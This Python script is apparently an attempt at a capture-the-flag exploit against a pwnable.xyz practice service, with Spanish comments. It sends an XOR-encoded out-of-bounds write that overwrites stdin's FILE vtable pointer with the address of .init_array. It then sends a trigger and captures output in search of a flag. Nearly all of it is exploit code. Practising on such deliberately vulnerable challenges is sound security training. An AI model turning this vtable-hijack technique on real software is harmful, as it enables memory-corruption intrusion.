#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

print("Conectando después de espera larga...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(35)

try:
    s.connect((host, port))
except Exception as e:
    print(f"ERROR: {e}")
    sys.exit(1)

print("¡Conectado!")
banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200
init_array = 0x201d90  # Contiene punteros: 0x940, 0x970

print(f"\nNueva idea: Apuntar vtable a .init_array ({hex(init_array)})")
print("init_array contiene punteros de función válidos")
print()

# NO llenar result[] esta vez - queremos que la vtable apunte a init_array

# Sobrescribir vtable (offset -5) con dirección de init_array
print(f"Sobrescribiendo stdin->vtable con {hex(init_array)}...")

b = 0x123456789
a = init_array ^ b
payload = f"{a} {b} -5\n"
s.sendall(payload.encode())

time.sleep(0.5)
try:
    resp = s.recv(2048)
    print(f"Respuesta: {resp.decode().strip()[:60]}")
except:
    pass

# Ahora trigger
print("\nEnviando trigger...")
s.setblocking(False)

try:
    s.sendall(b"10 20 5\n")
except:
    print("Error al enviar")

# Capturar
print("Capturando (25s)...")
all_data = b""
start = time.time()

while time.time() - start < 25:
    try:
        chunk = s.recv(8192)
        if chunk:
            all_data += chunk
            sys.stdout.write(chunk.decode())
            sys.stdout.flush()
    except:
        pass
    time.sleep(0.1)

print(f"\n{'='*60}")
if all_data:
    print(f"Recibido: {len(all_data)} bytes")
    decoded = all_data.decode()
    print(decoded)
    if "flag" in decoded.lower() or "{" in decoded:
        print("\n*** POSIBLE FLAG ***")
else:
    print("Sin output")
print('='*60)

s.close()